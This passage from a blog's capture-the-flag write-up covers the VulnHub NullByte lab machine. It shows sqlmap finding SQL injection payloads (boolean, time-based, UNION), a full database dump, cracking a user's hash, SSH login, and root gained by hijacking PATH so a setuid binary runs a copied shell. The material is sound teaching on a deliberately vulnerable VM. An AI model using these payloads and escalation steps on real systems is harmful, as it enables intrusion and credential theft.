&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 4.1 OR error-based - WHERE, HAVING clause&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL OR error-based - WHERE or HAVING clause&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL inline queries&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt; 5.0.11 stacked queries (SELECT - comment)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt; 5.0.11 stacked queries (SELECT)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt; 5.0.11 stacked queries (comment)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt; 5.0.11 stacked queries&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query - comment)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:21&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:22&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:22&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 OR time-based blind (SELECT)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:22&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; seems to be &lt;span class="s1"&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&amp;#39;&lt;/span&gt; injectable 
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; testing &lt;span class="s1"&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; automatically extending ranges &lt;span class="k"&gt;for&lt;/span&gt; UNION query injection technique tests as there is at least one other &lt;span class="o"&gt;(&lt;/span&gt;potential&lt;span class="o"&gt;)&lt;/span&gt; technique found
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; target URL appears to be UNION injectable with &lt;span class="m"&gt;3&lt;/span&gt; columns
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is &lt;span class="s1"&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt; injectable
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;WARNING&lt;span class="o"&gt;]&lt;/span&gt; in OR boolean-based injections, please consider usage of switch &lt;span class="s1"&gt;&amp;#39;--drop-set-cookie&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; you experience any problems during data retrieval
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:23:32&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;WARNING&lt;span class="o"&gt;]&lt;/span&gt; automatically patching output having last char trimmed

GET parameter &lt;span class="s1"&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is vulnerable. Do you want to keep testing the others &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; any&lt;span class="o"&gt;)&lt;/span&gt;? &lt;span class="o"&gt;[&lt;/span&gt;y/N&lt;span class="o"&gt;]&lt;/span&gt; sqlmap identified the following injection point&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; with a total of &lt;span class="m"&gt;152&lt;/span&gt; HTTP&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; requests:
---
Parameter: usrtosearch &lt;span class="o"&gt;(&lt;/span&gt;GET&lt;span class="o"&gt;)&lt;/span&gt;
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause &lt;span class="o"&gt;(&lt;/span&gt;MySQL comment&lt;span class="o"&gt;)&lt;/span&gt;
    Payload: &lt;span class="nv"&gt;usrtosearch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;-4968&lt;span class="s2"&gt;&amp;quot; OR 5589=5589#&lt;/span&gt;

&lt;span class="s2"&gt;    Type: AND/OR time-based blind&lt;/span&gt;
&lt;span class="s2"&gt;    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&lt;/span&gt;
&lt;span class="s2"&gt;    Payload: usrtosearch=x&amp;quot;&lt;/span&gt; AND &lt;span class="o"&gt;(&lt;/span&gt;SELECT * FROM &lt;span class="o"&gt;(&lt;/span&gt;SELECT&lt;span class="o"&gt;(&lt;/span&gt;SLEEP&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)))&lt;/span&gt;UcAb&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;

    Type: UNION query
    Title: MySQL UNION query &lt;span class="o"&gt;(&lt;/span&gt;NULL&lt;span class="o"&gt;)&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; columns
    Payload: &lt;span class="nv"&gt;usrtosearch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;x&lt;span class="s2"&gt;&amp;quot; UNION ALL SELECT CONCAT(0x716a6a6a71,0x5145485546617555536c,0x7171716b71),NULL,NULL#&lt;/span&gt;
&lt;span class="s2"&gt;---&lt;/span&gt;
&lt;span class="s2"&gt;[17:23:42] [INFO] the back-end DBMS is MySQL&lt;/span&gt;
&lt;span class="s2"&gt;web server operating system: Linux Debian&lt;/span&gt;
&lt;span class="s2"&gt;web application technology: Apache 2.4.10&lt;/span&gt;
&lt;span class="s2"&gt;back-end DBMS: MySQL 5.0.12&lt;/span&gt;
&lt;span class="s2"&gt;[17:23:42] [INFO] fetched data logged to text files under &amp;#39;/root/.sqlmap/output/192.168.61.147&amp;#39;&lt;/span&gt;

&lt;span class="s2"&gt;[*] shutting down at 17:23:42&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Success! We could start enumerating the available databases, tables, etc. However, why not just dump everything? I append the "--dump-all" switch and &lt;a href="http://linux.101hacks.com/unix/tee-command-examples/"&gt;tee&lt;/a&gt; the output. After the dump I do a search for ramses, and come across this. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Database: seth
Table: users
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; entries&lt;span class="o"&gt;]&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span class="p"&gt;|&lt;/span&gt; id &lt;span class="p"&gt;|&lt;/span&gt; pass                                        &lt;span class="p"&gt;|&lt;/span&gt; user   &lt;span class="p"&gt;|&lt;/span&gt; position   &lt;span class="p"&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span class="p"&gt;|&lt;/span&gt; ramses &lt;span class="p"&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; --not allowed--                             &lt;span class="p"&gt;|&lt;/span&gt; isis   &lt;span class="p"&gt;|&lt;/span&gt; employee   &lt;span class="p"&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;:24:09&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; table &lt;span class="s1"&gt;&amp;#39;seth.users&amp;#39;&lt;/span&gt; dumped to CSV file &lt;span class="s1"&gt;&amp;#39;/root/.sqlmap/output/192.168.61.147/dump/seth/users.csv&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There's a hash of some sort for ramses, but not for isis. It doesn't quite look like md5, sha256 perhaps? I don't know. For starters, I pipe it into Burp Suite Decoder and try out the options. After using the Base64 option I get a hash that looks more like a md5. Given it's most likely to be a password of some sort, on an Debian box, most likey md5. Hopefully it is. &lt;/p&gt;
&lt;p&gt;&lt;img alt="Burp Decoder" src="/images/base64.png"&gt;&lt;/p&gt;
&lt;p&gt;Okay great, now to crack it. We could use &lt;a href="http://www.openwall.com/john/"&gt;john&lt;/a&gt;, but &lt;a href="https://crackstation.net/"&gt;CrackStation&lt;/a&gt; is much faster :) This gives us the password of 'omega'. I'm hoping that this will be the credentials for the SSH loggin. Let's give it a shot. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh -l ramses -p &lt;span class="m"&gt;777&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.61.147
ramses@192.168.61.147&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov &lt;span class="m"&gt;26&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;:28:07 &lt;span class="m"&gt;2015&lt;/span&gt; from &lt;span class="m"&gt;192&lt;/span&gt;.168.61.146

ramses@NullByte:~$ ls
recent_history
ramses@NullByte:~$ cat recent_history
sudo -s
su eric
&lt;span class="nb"&gt;exit&lt;/span&gt;
ls
clear
&lt;span class="nb"&gt;cd&lt;/span&gt; /var/www
&lt;span class="nb"&gt;cd&lt;/span&gt; backup/
ls
./procwatch 
clear
sudo -s
&lt;span class="nb"&gt;cd&lt;/span&gt; /
ls
&lt;span class="nb"&gt;exit&lt;/span&gt;
ramses@NullByte:~$ sh
$ &lt;span class="nb"&gt;exit&lt;/span&gt;
ramses@NullByte:~$ which sh
/bin/sh
ramses@NullByte:~$ sudo sh
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; ramses: 
ramses is not in the sudoers file.  This incident will be reported.
ramses@NullByte:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Next clue, a program called procwatch in /var/www/backup. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/www/backup
ramses@NullByte:/var/www/backup$ ls
procwatch  readme.txt
rramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 &lt;span class="m"&gt;2208&lt;/span&gt; pts/0    &lt;span class="m"&gt;00&lt;/span&gt;:00:00 procwatch
 &lt;span class="m"&gt;2209&lt;/span&gt; pts/0    &lt;span class="m"&gt;00&lt;/span&gt;:00:00 sh
 &lt;span class="m"&gt;2210&lt;/span&gt; pts/0    &lt;span class="m"&gt;00&lt;/span&gt;:00:00 ps
ramses@NullByte:/var/www/backup$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Alright so procwatch seems to just be listing the processes. There has to be something more to this. After trying a number of useless attempts, I decide to take a slightly deeper look into this file. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:/var/www/backup$ ls -l procwatch 
-rwsr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;4932&lt;/span&gt; Aug  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:29 procwatch
ramses@NullByte:/var/www/backup$ file procwatch 
procwatch: setuid ELF &lt;span class="m"&gt;32&lt;/span&gt;-bit LSB executable, Intel &lt;span class="m"&gt;80386&lt;/span&gt;, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class="k"&gt;for&lt;/span&gt; GNU/Linux &lt;span class="m"&gt;2&lt;/span&gt;.6.32, BuildID&lt;span class="o"&gt;[&lt;/span&gt;sha1&lt;span class="o"&gt;]=&lt;/span&gt;17d666a0c940726b29feedde855535fb21cb160c, not stripped
ramses@NullByte:/var/www/backup$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Okay so we have an executable, that's running ps as root. Hmm. Okay since ps is really just a file in /bin, and $PATH sets the directories where executables can be found, I'm going to have to manipulate this environment variable. If I can get procwatch to run sh instead of ps, it should give me root shell :) I decide to copy the current shell executable (/bin/sh) into /tmp. I initially wanted to do &lt;code&gt;cp /bin/sh /usr/local/bin/ps&lt;/code&gt;  given /usr/local/bin was first on the list. Permission denied. Stupid decision I know. So end up prepending /tmp to $PATH, then running procwatch again. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ramses@NullByte:~$ cp /bin/sh /tmp/ps
ramses@NullByte:~$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:~$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$PATH&lt;/span&gt;
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; /var/www/backup
ramses@NullByte:/var/www/backup$ ./procwatch 
&lt;span class="c1"&gt;# id&lt;/span&gt;
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ramses&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ramses&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;euid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;ramses&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yes! Officially root. Now just grab the key and we are out of here!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# cd /root          &lt;/span&gt;
&lt;span class="c1"&gt;# ls&lt;/span&gt;
proof.txt
&lt;span class="c1"&gt;# cat proof.txt &lt;/span&gt;
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you &lt;span class="k"&gt;done&lt;/span&gt; that I wanna talk with you. Write a walk &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
&lt;span class="nv"&gt;Gms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="o"&gt;=&lt;/span&gt;PiAQ
-----END PGP PUBLIC KEY BLOCK-----
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That my friends is how it's done. For my first time, this was a excellent (although stressful) challenge. If you've stuck with me this far, thanks for hanging in there. I'll try to make future writeups more concise. Thanks to VulnHub for supplying and lyon for creating!&lt;/p&gt;</content><category term="ctf"></category><category term="vulnhub"></category><category term="tutorial"></category></entry></feed>